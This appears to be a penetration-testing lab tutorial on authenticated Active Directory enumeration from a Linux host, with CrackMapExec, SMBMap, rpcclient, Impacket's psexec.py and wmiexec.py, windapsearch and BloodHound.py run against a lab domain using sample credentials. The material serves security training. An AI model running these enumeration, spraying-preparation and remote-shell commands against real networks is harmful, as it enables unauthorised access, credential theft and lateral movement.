## Credentialed Enumeration from Linux

With valid domain credentials, you can enumerate the domain in much greater depth. The tools below are used from a Linux attack host targeting the INLANEFREIGHT.LOCAL domain with the credentials `forend:Klmcargo2`. At minimum you need a cleartext password, NTLM hash, or SYSTEM access on a domain-joined host to run these tools.

***

## CrackMapExec

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (CME, now [NetExec](https://github.com/Pennyw0rth/NetExec)) is built on top of [Impacket](https://github.com/fortra/impacket) and [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) and supports MSSQL, SMB, SSH, and WinRM protocols. Use `-h` on any protocol module to review all available options:

```bash
crackmapexec smb -h
```

Key SMB flags used throughout enumeration:

| Flag | Purpose |
|------|---------|
| `-u` | Username to authenticate with |
| `-p` | Password |
| `--users` | Enumerate domain users |
| `--groups` | Enumerate domain groups |
| `--loggedon-users` | Show users currently logged on to a target |
| `--shares` | List accessible shares and permissions |

### Domain User Enumeration

The output includes `badPwdCount` per user. Filter out any accounts with a value above 0 before spraying to avoid triggering a lockout:

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

Example output:

```
SMB  172.16.5.5  445  ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14
SMB  172.16.5.5  445  ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01
SMB  172.16.5.5  445  ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41
```

### Domain Group Enumeration

Group output includes member counts, which helps identify high-value targets like Domain Admins, Backup Operators, and any privileged IT groups:

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

Example output:

```
SMB  172.16.5.5  445  ACADEMY-EA-DC01  Administrators       membercount: 3
SMB  172.16.5.5  445  ACADEMY-EA-DC01  Domain Admins        membercount: 19
SMB  172.16.5.5  445  ACADEMY-EA-DC01  Backup Operators     membercount: 1
SMB  172.16.5.5  445  ACADEMY-EA-DC01  Contractors          membercount: 138
SMB  172.16.5.5  445  ACADEMY-EA-DC01  Executives           membercount: 10
```

### Logged On Users

Target specific hosts such as file servers to see who is currently logged in. A `(Pwn3d!)` tag in the output means your account has local admin rights on that host:

```bash
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

Example output:

```
SMB  172.16.5.130  445  ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
SMB  172.16.5.130  445  ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm    logon_server: ACADEMY-EA-DC01
SMB  172.16.5.130  445  ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys logon_server: ACADEMY-EA-DC01
SMB  172.16.5.130  445  ACADEMY-EA-FILE  INLANEFREIGHT\wley       logon_server: ACADEMY-EA-DC01
```

The user `svc_qualys` is a domain admin logged into this file server. If you can steal their credentials from memory or impersonate them, this becomes an immediate high-value path forward.

### Share Enumeration

Use `--shares` to list all available shares and your permission level on each:

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

Example output:

```
SMB  172.16.5.5  445  ACADEMY-EA-DC01  Share              Permissions
SMB  172.16.5.5  445  ACADEMY-EA-DC01  ADMIN$             NO ACCESS
SMB  172.16.5.5  445  ACADEMY-EA-DC01  C$                 NO ACCESS
SMB  172.16.5.5  445  ACADEMY-EA-DC01  Department Shares  READ
SMB  172.16.5.5  445  ACADEMY-EA-DC01  SYSVOL             READ
SMB  172.16.5.5  445  ACADEMY-EA-DC01  ZZZ_archive        READ
```

Non-standard shares like `Department Shares`, `User Shares`, and `ZZZ_archive` are worth digging into for sensitive data.

### Spider_plus Module

The `spider_plus` module recursively crawls a specified share and writes all discovered file paths and metadata to a JSON file at `/tmp/cme_spider_plus/<ip>.json`:

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

Inspect the JSON output for interesting files such as scripts, config files, or anything that may contain hardcoded credentials:

```bash
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json
```

***

## SMBMap

[SMBMap](https://github.com/ShawnDEvans/smbmap) is built specifically for SMB share enumeration and supports recursive directory listing, file content searching, and file upload and download.

### Check Share Access

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

Example output:

```
Disk                  Permissions
----                  -----------
ADMIN$                NO ACCESS
C$                    NO ACCESS
Department Shares     READ ONLY
IPC$                  READ ONLY
NETLOGON              READ ONLY
SYSVOL                READ ONLY
ZZZ_archive           READ ONLY
```

### Recursive Directory Listing

Use `-R` to recursively list a share and `--dir-only` to show only directories and suppress individual files:

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

Example output:

```
Department Shares
.\Department Shares\*
    Accounting
    Executives
    Finance
    HR
    IT
    Legal
    Marketing
    Operations
    R&D
    Temp
    Warehouse
```

***

## rpcclient

[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) allows both authenticated and unauthenticated enumeration over SMB. It exposes MS-RPC commands directly and can pull detailed user and group information.

### Connecting

```bash
rpcclient -U "" -N 172.16.5.5
```

### Understanding RIDs

A Relative Identifier (RID) is a unique hex value appended to the domain SID to form a full object SID. Some RIDs are fixed regardless of the environment:

- Built-in Administrator always has RID `0x1f4` (decimal 500)
- Guest always has RID `0x1f5` (decimal 501)
- `krbtgt` always has RID `0x1f6` (decimal 502)

For a user like `htb-student` with RID `0x457` (decimal 1111), their full SID would be:

```
S-1-5-21-3842939050-3880317879-2865463114-1111
```

### Enumerate All Domain Users

```
rpcclient $> enumdomusers
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
```

### Query a Specific User by RID

```
rpcclient $> queryuser 0x457
```

This returns full account detail including password last set time, logon count, bad password count, and group RID membership.

***

## Impacket Toolkit

[Impacket](https://github.com/fortra/impacket) is a Python toolkit for interacting with Windows protocols. Two of its most useful execution modules are `psexec.py` and `wmiexec.py`.

### psexec.py

Uploads a randomly named executable to `ADMIN$`, registers it as a service via RPC, and returns an interactive shell running as SYSTEM. Requires local admin credentials on the target:

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

This drops you into `system32` with SYSTEM privileges.

### wmiexec.py

Executes commands through [Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not upload any files or executables to disk and generates fewer logs than `psexec.py`. It runs as the authenticating user rather than SYSTEM, which is less conspicuous:

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

Note: the shell is semi-interactive. Each command spawns a new `cmd.exe` process via WMI, which generates Event ID [4688 (A new process has been created)](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688) in the logs.

***

## Windapsearch

[windapsearch](https://github.com/ropnop/windapsearch) is a Python script for LDAP-based enumeration of users, groups, and computers. It supports recursive nested group lookups, which is particularly useful for identifying privilege escalation paths through group membership.

### Enumerate Domain Admins

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

Example output:

```
[+] Found 28 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm
cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local
```

### Enumerate Privileged Users (Recursive)

The `-PU` flag performs a recursive search through nested groups to surface any user with elevated privileges, including those who may have inherited rights indirectly:

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

This will surface nested members across groups like Domain Admins, Enterprise Admins, and other elevated groups. Users with inherited admin rights through nested group membership are often a blind spot for defenders and worth highlighting in your report.

***

## BloodHound.py

[BloodHound](https://github.com/BloodHoundAD/BloodHound) is the most impactful AD auditing tool available to penetration testers. It maps relationships between users, groups, computers, GPOs, and ACLs and uses graph theory to visualise attack paths to Domain Admin. The [BloodHound.py](https://github.com/fox-it/BloodHound.py) ingestor allows collection from a Linux host without needing access to a domain-joined Windows machine.

### Running the Ingestor

Use `-c all` to collect all available data types. Point the nameserver at the Domain Controller with `-ns`:

```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

Example output:

```
INFO: Found 1 domains
INFO: Found 564 computers
INFO: Found 2951 users
INFO: Found 183 groups
INFO: Found 2 trusts
```

This produces JSON files in the current directory:

```
20220307163102_computers.json
20220307163102_domains.json
20220307163102_groups.json
20220307163102_users.json
```

### Loading Data into BloodHound GUI

1. Start the Neo4j database: `sudo neo4j start`
2. Launch the GUI: `bloodhound`
3. Default credentials: `neo4j / HTB_@cademy_stdnt!`
4. Zip the JSON files: `zip -r ilfreight_bh.zip *.json`
5. Click Upload Data in the GUI and select the zip file

### Analysing Attack Paths

Use the Analysis tab to run pre-built queries. The most immediately useful query is Find Shortest Paths To Domain Admins, which maps all logical paths through users, groups, hosts, ACLs, and GPOs that lead to Domain Admin privileges. Custom [Cypher](https://neo4j.com/docs/cypher-manual/current/introduction/) queries can be entered in the Raw Query box at the bottom of the GUI for more targeted analysis.
